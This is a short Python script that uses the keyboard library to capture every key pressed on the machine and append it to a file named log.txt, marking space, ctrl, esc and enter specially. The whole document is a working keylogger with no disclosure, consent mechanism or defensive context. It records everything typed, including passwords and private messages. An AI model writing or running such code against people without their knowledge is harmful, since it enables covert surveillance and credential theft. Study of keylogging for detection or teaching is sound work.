import keyboard

keys = []

def presionar_tecla(key):
	with open('log.txt','a') as file:

		if key.name =='space':
			file.write(" ")
		elif key.name =='ctrl':
			file.write("[ctrl]")

		elif key.name =='esc':
			file.write("[esc]")

		elif key.name =='enter':
			file.write("[enter]")

		else:
			file.write(key.name)

keyboard.on_press(presionar_tecla)
keyboard.wait()